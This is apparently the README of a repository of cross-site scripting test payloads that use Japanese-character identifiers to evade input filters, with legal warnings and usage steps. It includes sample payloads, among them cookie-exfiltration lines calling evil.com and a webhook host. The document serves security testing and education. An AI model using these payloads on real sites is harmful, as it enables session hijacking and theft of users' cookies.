# XSS Testing Payloads with Japanese Obfuscation

This repository contains a collection of Cross-Site Scripting (XSS) test vectors, primarily obfuscated using Japanese characters (hiragana, katakana, and kanji) to bypass basic input filters. These payloads are intended for educational and security testing purposes only, such as evaluating web application vulnerabilities in controlled environments.

## ⚠️ Important Warnings

- **Destructive Potential**: Some payloads in this collection are designed to exfiltrate sensitive data (e.g., cookies, domain info), perform redirections, or execute arbitrary code. If injected into a vulnerable application, they could lead to data theft, session hijacking, or other security breaches. **Do not use these on live websites, production systems, or without explicit permission**. Unauthorized use may violate laws (e.g., Computer Fraud and Abuse Act) and could result in legal consequences.
  
- **Use Caution**: Always test in a safe, isolated environment (e.g., a local VM or a test server you control). Modern browsers and security tools may block or flag these payloads. If you're new to XSS testing, consult resources like OWASP's XSS Prevention Cheat Sheet.

- **Ethical and Legal Responsibility**: These payloads are for defensive security research only. Misuse for malicious purposes is unethical and illegal. If you're not a security professional, consider using established tools like OWASP ZAP or Burp Suite instead.

## How to Use

1. **Clone or Download**: Get the payloads from this repo.
2. **Customize for Safety**:
   - Replace any hardcoded URLs (e.g., `evil.com`) with your own controlled endpoint, such as a webhook or logging server. This prevents accidental data leakage or unintended requests.
     - Example: Change `evil.com?c='+btoa(document.cookie)` to `your-webhook-url.com?c='+btoa(document.cookie)`.
     - Use a service like RequestBin, ngrok, or a self-hosted server to capture requests safely.
   - Modify payloads as needed for your testing scenario (e.g., adjust alert messages or add logging).
3. **Test Responsibly**:
   - Inject payloads into a test application (e.g., via input fields or URL parameters).
   - Monitor for execution and ensure no real data is exposed.
   - Verify with tools like browser dev consoles or network inspectors.

## Examples

- Basic alert: `あ=alert;あ(1);` (Triggers a popup with "1").
- Data exfiltration: `宝=fetch;石='your-webhook.com?i='+encodeURIComponent(document.cookie);宝(石);` (Sends cookies to your webhook—replace `your-webhook.com` accordingly).

## Contributing

Feel free to submit pull requests with new payloads or improvements, but ensure they align with ethical guidelines. Include documentation for any additions.

## Disclaimer

The authors and contributors are not responsible for any misuse of this content. Use at your own risk. This is not legal advice—consult professionals for security matters.
